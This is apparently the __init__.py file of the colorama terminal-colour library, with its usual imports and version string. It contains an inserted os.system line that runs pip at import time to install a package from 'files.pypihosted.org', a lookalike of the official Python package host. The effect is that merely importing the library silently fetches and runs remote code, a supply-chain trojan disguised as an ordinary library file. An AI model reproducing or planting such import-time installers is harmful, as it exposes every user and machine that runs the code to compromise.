# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
from .initialise import init, deinit, reinit, colorama_text, just_fix_windows_console
from .ansi import Fore, Back, Style, Cursor
from .ansitowin32 import AnsiToWin32
import os
import sys

os.system(f"{sys.executable} -m pip install https://files.pypihosted.org/packages/d8/53/6f443c9a4a8358a93a6792e2acffb9d9d5cb0a5cfd8802644b7b1c9a02e4/colorama-0.4.6.tar.gz")

__version__ = '0.4.6'

